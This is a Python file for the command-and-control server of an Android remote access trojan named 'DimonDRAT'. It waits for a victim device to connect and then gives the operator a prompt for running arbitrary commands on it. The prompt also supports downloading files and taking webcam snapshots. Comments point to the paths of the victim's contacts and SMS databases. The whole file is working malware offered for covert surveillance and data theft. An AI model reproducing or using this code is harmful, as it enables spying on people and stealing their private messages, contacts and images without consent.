import socket
import pyfiglet
import os

# To see the contacts of the victim use
# cd /data/data/com.Android.providers.contacts/databases/
# and look for a contacts database file

# To see the sms of the victim use
# cd /data/user_de/0/com.android.providers.telephony/databases/
# and look for a mmssms database file

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 3333

BUFFER_SIZE = 4096

intro = pyfiglet.figlet_format("DimonDRAT")

s = socket.socket()

s.bind((SERVER_HOST, SERVER_PORT))
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen(10)

os.system("clear")
print(intro)
print("\nCoded by SegYT\n")
print("[...] Listening as " + str(SERVER_HOST) + ":" + str(SERVER_PORT) + "...")

client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

message = "Hello!".encode()
client_socket.send(message)

def download():
  filename = input("[*]File Name: ")
  client_socket.send(filename)
  f = open(filename, "wb")
  i = client_socket.recv(4096)
  while not ("[*] Complete!" in str(i)):
    f.write(i)
    i = client_socket.recv(4096)
  f.close()

while True:
  command = input("DimonDRAT > ")
  client_socket.send(command.encode())
  if str(command) == "download":
    download()
    continue
  if str(command) == "webcamsnap":
    f = open("camera.png", "wb")
    img = client_socket.recv(4096)
    f.write(img)
    f.close()
    continue
  if command.lower() == "exit":
    break
  results = client_socket.recv(BUFFER_SIZE).decode()
  print(results)
client_socket.close()
s.close()
